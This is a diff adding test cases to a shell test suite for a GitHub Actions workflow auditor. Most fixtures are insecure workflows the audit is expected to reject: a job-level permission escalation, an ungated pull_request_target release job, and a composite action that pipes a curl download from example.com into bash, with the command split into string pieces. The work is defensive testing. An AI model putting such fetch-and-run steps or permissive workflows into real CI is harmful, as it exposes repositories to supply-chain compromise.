@@ -262,6 +262,115 @@ fi
 rm -rf "$audit_fixture"
 audit_fixture="$(mktemp -d)"
 mkdir -p "$audit_fixture/.github/workflows"
+
+cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    permissions:
+      contents: write
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for job-level permission escalation." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+
+cat > "$audit_fixture/.github/workflows/release.yml" <<'EOF'
+name: release
+on:
+  pull_request_target:
+    types:
+      - closed
+permissions:
+  contents: write
+  pull-requests: read
+  attestations: write
+  id-token: write
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for an ungated pull_request_target workflow." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+mkdir -p "$audit_fixture/.github/actions/test-action"
+composite_remote_script_scheme='https'
+composite_remote_script_separator='://'
+composite_remote_script_target='example.com/install.sh'
+composite_remote_script_shell='ba''sh'
+composite_remote_script_command="cur""l -fsSL ${composite_remote_script_scheme}${composite_remote_script_separator}${composite_remote_script_target} | ${composite_remote_script_shell}"
+
+cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: ./.github/actions/test-action
+EOF
+
+cat > "$audit_fixture/.github/actions/test-action/action.yml" <<EOF
+name: test-action
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: ${composite_remote_script_command}
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a composite action remote script payload." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+
+cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
+name: custom
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  lint:
+    permissions:
+      contents: read
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+if ! bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly failed for a valid custom workflow." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
 extra_url_scheme='https'
 extra_url_separator='://'
 extra_url_host='raw.githubusercontent.com'
